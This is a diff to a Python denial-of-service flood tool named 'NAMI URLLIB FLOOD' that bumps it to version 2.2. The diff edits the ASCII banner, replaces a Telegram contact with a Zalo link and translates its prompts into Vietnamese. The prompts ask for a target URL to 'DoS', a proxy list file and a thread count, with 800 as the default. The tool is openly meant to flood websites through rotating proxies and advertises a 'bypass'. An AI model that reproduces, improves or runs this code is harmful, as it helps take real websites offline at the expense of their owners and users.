@@ -184,17 +184,17 @@ class Spammer(threading.Thread):
         sys.exit(0)
 def title():
     stdout.write("                                                                                          \n")
-    stdout.write("                   ""       (_)   (_)                  (_)                   \n")
-    stdout.write("                   ""       (__)_ (_)  ____   __   __   _                   \n")
+    stdout.write("                   ""       (_)   (_)       NAMI      (_)                   \n")
+    stdout.write("                   ""       (__)_ (_)  ____   __   __   _                  \n")
     stdout.write("                   ""       (_)(_)(_) (____) (__)_(__) (_)                \n")
     stdout.write("                   ""       (_)  (__)( )_( )(_) (_) (_)(_)                \n")
-    stdout.write("                   ""       (_)   (_) (__)_)(_) (_) (_)(_)                \n")
+    stdout.write("                   ""       (_)   (_) (__)_)(_) (_) (_)(_)  Version 2.2   \n")
     stdout.write("                   ""                                                \n")
     stdout.write("             "            +"        ══╦═════════════════════════════════╦══\n")
     stdout.write("             "+"╔═════════╩═════════════════════════════════╩═════════╗\n")
-    stdout.write("             "+"║             NAMI URLLIB FLOOD             ""          ║\n")
+    stdout.write("             "+"║             NAMI-V2.2 URLLIB FLOOD        ""          ║\n")
     stdout.write("             "+"║        ADDED NEW METHOD AND BYPASS    ""              ║\n")
-    stdout.write("             "+"║        Tele https://t.me/adfhjktewwyjqk   ""          ║\n")
+    stdout.write("             "+"║        Zalo: https://zalo.me/0765698140   ""          ║\n")
     stdout.write("             "+"╚═════════════════════════════════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
@@ -215,17 +215,17 @@ class MainLoop():
     def setup(self):
         global Close, Request, Tot_req
         while True:        
-            url = input('> Enter Url to DoS: ')
+            url = input('> Nhập link website: ')
             url = self.check_url(url)
             try:
                 req = urllib.request.Request(url, None, {'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36'})
                 response = urllib.request.urlopen(req)
                 break
             except:
-                print ('> Could not open specified url.')
+                print ('> Không thể mở link.')
         while True:            
             try:
-                l = str(input('> Enter the list of proxy: '))
+                l = str(input('> Nhập proxy = proxy.txt: '))
                 in_file = open(l,"r")
                 lista = []
                 for i in in_file:
@@ -235,7 +235,7 @@ class MainLoop():
                 print ('Error to read file.')
         while True:                
             try:
-                num_threads = int(input('> Enter the number of thread [800]: '))
+                num_threads = int(input('> Nhập số lượng máy chủ atak [800]: '))
             except:
                 num_threads = 800
             break
